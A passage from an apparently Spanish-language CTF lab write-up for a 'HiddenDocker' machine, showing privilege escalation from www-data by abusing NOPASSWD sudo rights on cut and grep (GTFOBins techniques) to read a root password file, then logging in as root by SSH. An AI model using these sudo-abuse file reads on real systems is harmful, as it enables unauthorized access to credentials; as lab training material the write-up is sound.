Bien, nos han dejado una pista de dónde se encuentra la posible contraseña del **usuario Root**.

Veamos si nuestro usuario tiene algún privilegio que nos ayude:
```bash
www-data@a34889d3b818:/$ sudo -l
Matching Defaults entries for www-data on a34889d3b818:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User www-data may run the following commands on a34889d3b818:
    (root) NOPASSWD: /usr/bin/cut
    (root) NOPASSWD: /usr/bin/grep
```
Genial, podemos usar los comandos **cut y grep** con privilegios de **Root**.

Y al investigar en la **guía de GTFOBins**, encontraremos las formas en que podemos utilizar ambos comandos para leer archivos con privilegios.

Primero, el comando **cut**:
* <a href="https://gtfobins.github.io/gtfobins/cut/" target="_blank">GTFOBins: cut</a>

Utilizaremos estos comandos:

<p align="center">
<img src="/assets/images/THL-writeup-hiddenDocker/Captura20.png">
</p>

Y los aplicamos:
```bash
www-data@a34889d3b818:/$ LFILE=/root/clave.txt
www-data@a34889d3b818:/$ sudo cut -d "" -f1 "$LFILE"
...
```
Excelente, si parece ser una contraseña.

Ahora el comando **grep**:
* <a href="https://gtfobins.github.io/gtfobins/grep/" target="_blank">GTFOBins: grep</a>

Son casi los mismos comandos:
<p align="center">
<img src="/assets/images/THL-writeup-hiddenDocker/Captura21.png">
</p>

Solamente utilizamos el último para leer el archivo deseado:
```bash
www-data@a34889d3b818:/$ sudo grep '' $LFILE
...
```
Funcionó también.

Probemos esa contraseña:
```bash
ssh root@192.168.10.130
root@192.168.10.130's password: 
Linux hiddendocker 6.1.0-21-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.90-1 (2024-05-03) x86_64
Last login: Sat Jun 21 03:04:56 2025
root@hiddendocker:~# whoami
root
```
Muy bien, ganamos acceso como **Root**.

Ya solo veamos la última flag:
```bash
root@hiddendocker:~# ls
root.txt
root@hiddendocker:~# cat root.txt
...
```
Y con esto, terminamos la máquina.
